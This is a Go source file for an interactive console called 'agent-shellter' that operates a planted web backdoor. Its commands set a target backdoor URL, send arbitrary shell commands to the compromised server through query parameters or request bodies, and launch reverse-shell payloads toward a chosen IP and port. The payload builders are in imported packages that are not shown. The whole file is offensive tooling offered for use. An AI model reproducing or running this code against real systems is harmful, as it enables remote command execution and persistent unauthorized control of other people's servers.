package main

import (
	"fmt"
	"net/url"
	"os"
	"strings"

	payload "agent-shellter/payload"
	request "agent-shellter/request"

	prompt "github.com/c-bata/go-prompt"
)

var (
	Url      string
	Cmd      string
	InParams string
	Type     string
	Ip       string
	Port     string
	RevType  string
)

/* terminal mode*/
var LivePrefixState struct {
	LivePrefix string
	IsEnable   bool
}

/* Execute mode from terminal*/
func executor(in string) {
	in = strings.TrimSpace(in)
	blocks := strings.Split(in, " ")
	switch blocks[0] {

	/*	vuln url posible to rce payload */
	case "url":
		if len(blocks) < 2 {
			fmt.Println("please set query, Example : url localhost/test.php")
			return
		}

		Url = blocks[1]
		fmt.Println("[+] Set url backdoor : ", Url)

	/* command for shell execute in target machine*/
	case "command":
		if len(blocks) < 2 {
			fmt.Println("please set query, Example : command ls")
			return
		}

		// command := blocks[1]
		interactCommand := strings.Split(in, "command ")

		if InParams == "yes" {
			url := Url + url.QueryEscape(interactCommand[1])
			request.DoRequest(url)
			return
		}

		/*If payload send in body format parses the command*/
		// interactCommand := strings.Split(in, "command")
		malpaylaoad := payload.GenPayload(Type, interactCommand[1])
		request.DoPostRequestPayloadInBody(Url, malpaylaoad)
		return

	/*  if params is 'yes' payload will deliver in paramsurl
	 *  if params is no you can customize the payload format
	 */
	case "params":
		if len(blocks) < 2 {
			InParams = "no"
			return
		}

		InParams = blocks[1]
		fmt.Println("[+] Set Params : ", InParams)
		return

	/* Check url is still exist or not*/
	case "connect":
		request.DoCheckFileBackdoor(Url)
		return

	/* The type of payload */
	case "type":
		if len(blocks) < 2 {
			fmt.Println("please set query, Example : type php")
			return
		}
		Type = blocks[1]
		fmt.Println("[+] Set type : ", Type)
		return

	case "show":
		fmt.Println("[+] URL : ", Url)
		fmt.Println("[+] Type : ", Type)
		fmt.Println("[+] Params : ", InParams)
		return

	case "ip":
		if len(blocks) < 2 {
			fmt.Println("please set query, Example : ip x.x.x.x")
			return
		}
		Ip = blocks[1]
		fmt.Println("[+] Set IP : ", Ip)
		return

	case "port":
		if len(blocks) < 2 {
			fmt.Println("please set query, Example : port x.x.x.x")
			return
		}
		Port = blocks[1]
		fmt.Println("[+] Set Port : ", Port)
		return
	case "revshell":

		/*If payload send in body format parses the command*/
		// interactCommand := strings.Split(in, "command")
		malpaylaoad := payload.RevShell(Ip, Port, RevType)
		if InParams == "yes" {
			url := Url + url.QueryEscape(malpaylaoad)
			fmt.Println(url)
			request.DoRequest(url)
			return
		}
		// request.DoPostRequestPayloadInBody(Url, malpaylaoad)
		return

	case "revtype":
		RevType = blocks[1]
		fmt.Println("[+] Set rev type : ", RevType)
		return

	case "exit":
		os.Exit(1)
		return

	}

	if in == "" {
		LivePrefixState.IsEnable = true
		LivePrefixState.LivePrefix = in
		return
	}

	LivePrefixState.LivePrefix = blocks[0] + "-->> "
	LivePrefixState.IsEnable = true
}

func completer(in prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "url", Description: "Url for your backdoor "},
		{Text: "command", Description: "Malicious Payload "},
		{Text: "revshell", Description: "reverse shell  Payload "},
		{Text: "params", Description: "Payload position "},
		{Text: "connect", Description: "check backdoor file "},
		{Text: "type", Description: "type payload deliver example : type php"},
		{Text: "exit", Description: "exit shellter"},
		{Text: "show", Description: "Show variables status"},
		{Text: "ip", Description: "set ip address for reverse shell"},
		{Text: "port", Description: "set port for reverse shell"},
		{Text: "revtype", Description: "set port for rev type	"},
	}
	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
}

func changeLivePrefix() (string, bool) {
	return LivePrefixState.LivePrefix, LivePrefixState.IsEnable
}

func main() {
	p := prompt.New(
		executor,
		completer,
		prompt.OptionPrefix("-->> "),
		prompt.OptionLivePrefix(changeLivePrefix),
		prompt.OptionTitle("live-prefix-example"),
	)
	p.Run()
}
